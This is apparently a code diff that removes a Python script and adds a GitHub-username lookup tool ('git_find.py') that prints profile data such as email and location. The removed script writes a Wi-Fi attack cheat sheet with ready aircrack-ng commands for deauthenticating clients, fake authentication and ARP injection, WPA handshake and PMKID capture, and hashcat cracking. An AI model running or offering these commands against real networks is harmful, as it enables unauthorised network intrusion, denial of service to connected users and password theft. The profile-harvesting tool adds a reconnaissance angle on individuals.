@@ -1,172 +1,102 @@
 
 
-
-# CREATES INDIVIDUAL CATEGORIZED FOLDERS FOR ANY RECONNAISSANCE
-
-# Note: If ran in sudo Permissions will default to "Locked" 
-
-
-import os
-
-main = 'AP'
-sub_one = 'SharkCaps'
-sub_two = 'WordLi'
-sub_tree = 'Hashcat'
-sub_four = 'Xtras'
-# sub_five = 'Xtras_2'
-
-os.mkdir(main, mode=0o777)
-# "0o777" is Defauly Mode to unlock all permissions ...
-os.mkdir(sub_one, mode=0o777)
-os.mkdir(sub_two, mode=0o777)
-os.mkdir(sub_tree, mode=0o777)
-os.mkdir(sub_four, mode=0o777)
-# os.mkdir(sub_five, mode=0o777)
-
-# [ "os.chmod" can change the permissions of anyy Directory or File created by "os", or any other arugment you use such as "open/write" ]
-
-
-file = open("Man", "w") 
-file.write("""
-
-Tools:
-
-airmon-ng
-airodump-ng
-aireplay-ng
-aircrack-ng
-Monitoring, Recon and Dumping
-
-Using the aircrack-ng suite, Turn on the monitor mode
-
-[+] sudo airmon-ng start wlan0
-
-Simple passive listening and capture, Used to discover AP in the environment
-
-[+] sudo airodump-ng wlan0mon
-
-Targeted listening and capture, Focus on one AP and one channel
-
-[+] airodump-ng wlan0mon -c 11 --bssid E8:2C:6D.... -w sonic
-
-Attacking WEP
-
-WEP is an old encryption protocol but still used in some places, It is vulnerable to direct cracking attacks
-
-Here, you want to get the 4-way WPA Handshake, It requires network traffic between the AP and one device
-
-The process can be enhanced by sending deauth packets – – You can Deauth Packets to every device on the Network with “-a” … or you can target a specific device on the Network by adding “-c”
-
-Aireplay Command used to send Deauth Packets “0” (See sources for more reference)
-Deauth connected devices while airodump is running in a separate Terminal to initiate authentication process and try to get the handshake
-
-In the airodump-ng Terminal, the WPA handshake will appear once captured
-
-[+] aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon
-
-- 0 means deauthentitcation - - 15 is number of deauths sent
-
-- a mac address of access point
-
-- c mac address of the client (station #) (This is optional, you can choose to not add this and knock all devices off network)
-- wlan0mon is the interface name
-# Another possibility is to use fake authentication to generate IV
-
-# -1 = fake authentication
-
-# 0 = delay between association demands
-
-# -e = AP ESSID (name)
-
-# -a = AP MAC
-
-# -h = attacker MAC
-
-[+] aireplay-ng -1 0 -e teddy -a 00:14:7K:7E:40:80 -h 00:0F:9K:88:9K:82 wlan0mon
-
-# ARP Sniffing and injection is another method
-
-[+] aireplay-ng -3 -b 00:14:3C:7E:40:80 -h 00:0F:B5:K8:AC:32 wlan0mon
-
-Aircrack-ng too directly crack the WEP Key
-
-Cracking can be done using aircrack-ng
-
-Note: Use a good Wordlist !
-
-[+] aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:88:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'
-
-- a [a.mode]: force attack mode (1/WEP, 2/WPA-PSK)
-- b [bssid]: target selection: access point's MAC
-- w [words]: path to wordlist(s) filename(s)
-- Drag and drop the .cap file
-Other tools like hashcat can be used for cracking a Network, The outfile needs to be an HCCAPX file [Hashcat utils provide a binary to convert]
-
-Attacking WPA2 PSK w/ HASHCAT (The old way)
-
-[+] aircrack-ng outfile -w wordlist
-
-# But also using other tools like hashcat
-
-# The outfile needs to be an HCCAPX file
-
-# Hashcat utils provide a binary to convert
-
-./cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx
-
-# Then you can crack it like a normal hash (see hashcat section)
-
-./hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt –force -O
-
-Attacking WPA2 using PMKID
-
-# You don’t need any network traffic
-
-# Using hcxtools and hcxdumptool
-
-# Monitor mode
-
-sudo airmon-ng start wlan0mon
-
-# PMKID capture
-
-# It can take a while to capture PKMID (several minutes++)
-
-# If an AP recieves our association request packet and supports sending 
-
-sudo hcxdumptool -i wlan0mon -o outfile.pcapng –enable_status=1
-
-# Then convert the captured data to a suitable format for hashcat
-
-# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
-
-# -I retrieve identities from WiFi-traffic
-
-# -U retrieve usernames from WiFi-traffic
-
-sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng
-
-# Then, you can use hashcat to crack it (see hashcat section)
-
-./hashcat -m 16800 test.16800 -a 3 -w 3 ‘?l?l?l?l?l?lt!’
-
-Sources:
-
-https://www.aircrack-ng.org/doku.php?id=cracking_wpa
-
-https://www.aircrack-ng.org/doku.php?id=newbie_guide
-
-https://www.aircrack-ng.org/doku.php?id=compatibility_drivers
-
-https://www.aircrack-ng.org/doku.php?id=wpa_capture
-
-https://shehackske.medium.com/capturing-and-cracking-wpa-handshake-using-aircrack-ng-d9496f30c7c3
-
-https://cryptokait.com/2020/09/02/taking-password-cracking-to-the-next-level/
-Update:
-
-After running, airmon-ng check kill to activate adapter to find AP’s
-
-run, service NetworkManager restart – To turn back on Network wifi
-    """) 
-file.close()
+# Required Py Libraries - [ Requirements.txt ]
+# pip install requests
+# pip install bs4
+# pip install colorama
+
+# USAGE :
+#
+# python3 git_find.py kalistamp
+
+import requests
+import colorama
+import argparse
+from bs4 import BeautifulSoup
+from colorama import Fore
+from colorama import Style
+
+x = ' '
+
+# [ COLOR LEGEND : ]
+
+colorama.init(autoreset=True)
+RED = Fore.RED
+BLUE = Fore.CYAN
+MAG = Fore.MAGENTA
+RESET = colorama.Fore.RESET
+LIT = Style.BRIGHT
+
+def GHF_logo():
+    GHF = f''' {BLUE}{LIT}
+       .--.                   .---.
+   .---|__|           .-.     |~~~|
+.--|===|--|_          |_|     | F |--.
+|--|===|  |'\     .---!~|  .--| I |--|
+|  | G |  |.'\    |===| |--|--| N |  |
+|  | I |  |\.'\   | H | |__|  | D |  |
+|  | T |  | \  \  | U | |==|  | E |  |
+|  |   |__|  \.'\ | B |_|__|  | R |__|
+|--|===|--|   \.'\|===|~|--|--|~~~|--|
+'--'---'--'    `-'`---'-'--'--'---'--' GHF
+    '''
+    print(GHF)
+
+GHF_logo()
+print(x)
+print(f'{BLUE}{LIT} By: Kalistamp')
+print(x*2)
+
+parser = argparse.ArgumentParser(f'{RED}{LIT} DESCRIPTION: Enter Github Username [   ]  {RESET}')
+parser.add_argument('github', help='Enter the USERNAME of Github Account')
+
+
+args = parser.parse_args()
+
+if args.github:
+    try:        
+        username = args.github
+        url = f'https://api.github.com/users/{username}'
+        response = requests.get(url)
+        if response.status_code == 200 and requests.codes.ok:
+            data = response.json()
+            print(f'{RED}{LIT}Result =  {response}')
+            print(x*2)
+            print(f"[+] Name : {data['name']}")
+            print(f"[+] Id : {data['id']}")
+            print(f"[+] Node Id : {data['node_id']}")
+            print(f"[+] Gravatar Id : {data['gravatar_id']}")
+            print(f"[+] Bio : {data['bio']}")
+            print(f"[+] Location : {data['location']}")
+            print(f"[+] Email : {data['email']}")
+            print(f"[+] Twitter Username : {data['twitter_username']}")
+            print(f"[+] Company : {data['company']}")
+            print(f"[+] Type : {data['type']}")
+            print(f"[+] Blog : {data['blog']}")
+            print(f"[+] Followers : {data['followers']}")
+            print(f"[+] Following : {data['following']}")
+            print(f"[+] Public Gists : {data['public_gists']}")
+            print(f"[+] Public Repos : {data['public_repos']}")
+            print(f"[+] Created At : {data['created_at']}")
+            print(f"[+] Updated At : {data['updated_at']}")
+            print(f"[+] Organizations : {data['organizations_url']}")
+            print(f"[+] Url : {data['url']}")
+            print(f"[+] Html Url : {data['html_url']}")
+            print(f"[+] Avatar Url : {data['avatar_url']}")
+            print(f"[+] Followers Url : {data['followers_url']}")
+            print(f"[+] Following Url : {data['following_url']} (You Must Copy Like This )--> https://api.github.com/users/{username}/following")
+            print(f"[+] Events Url : {data['events_url']} (You Must Copy Like This )--> https://api.github.com/users/{username}/events")
+            print(f"[+] Received Events Url : {data['received_events_url']} (You Must Copy Like This )--> https://api.github.com/users/{username}/received_events")
+            print(f"[+] Gists Url : {data['gists_url']} (You Must Copy Like This )--> https://api.github.com/users/{username}/gists")
+            print(f"[+] Starred Url : {data['starred_url']} (You Must Copy Like This )--> https://api.github.com/users/{username}/starred")
+            print(f"[+] Repos Url : {data['repos_url']}")
+            print(f"[+] Subscriptions Url : {data['subscriptions_url']}")
+        else:
+            print(f'{RED}{LIT}Result =  {response}')
+            print(x*2)
+            print(f'{RED}{LIT}[!] Invalid USERNAME{RESET} ¯\_(ツ)_/¯ \n ')
+            print(x)
+            print(f'{RED}{LIT}Please Try Again ...')
+            print(x)
+    except KeyboardInterrupt:
+        print('exit boiii')
